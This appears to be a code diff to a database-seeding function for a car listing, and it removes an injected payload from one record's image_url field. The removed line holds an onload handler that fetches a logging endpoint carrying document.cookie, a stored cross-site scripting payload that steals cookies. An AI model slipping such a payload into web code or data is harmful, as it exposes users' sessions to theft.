@@ -209,7 +209,7 @@ async function seedDatabase(db) {
         name: "Honda Civic LX",
         year: 2023,
         price: 23500,
-        image_url: "https://di-uploads-pod10.dealerinspire.com/hondaworlddowney/uploads/2018/03/2017-honda-civic-lx-front-side.jpg" onload=\"fetch('/api/log?data='+encodeURIComponent(document.cookie))",
+        image_url: "https://di-uploads-pod10.dealerinspire.com/hondaworlddowney/uploads/2018/03/2017-honda-civic-lx-front-side.jpg",
         mileage: 15000,
         color: "Crystal Red",
         transmission: "CVT",
